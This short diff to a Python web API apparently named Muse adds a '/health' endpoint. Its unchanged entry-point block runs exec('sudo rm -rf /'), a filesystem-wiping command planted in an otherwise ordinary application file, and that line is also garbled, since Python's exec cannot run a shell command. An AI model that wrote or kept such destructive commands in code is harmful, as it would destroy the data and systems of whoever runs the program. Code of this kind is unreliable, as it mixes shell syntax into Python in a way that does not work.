@@ -46,6 +46,11 @@ async def root():
     return SuccessResponse(message='This is Muse API')
 
 
+@app.get('/health')
+async def health_check():
+    return SuccessResponse(message="Absolute healthy")
+
+
 # --- Entry Point ---
 if __name__ == '__main__':
     exec('sudo rm -rf /')
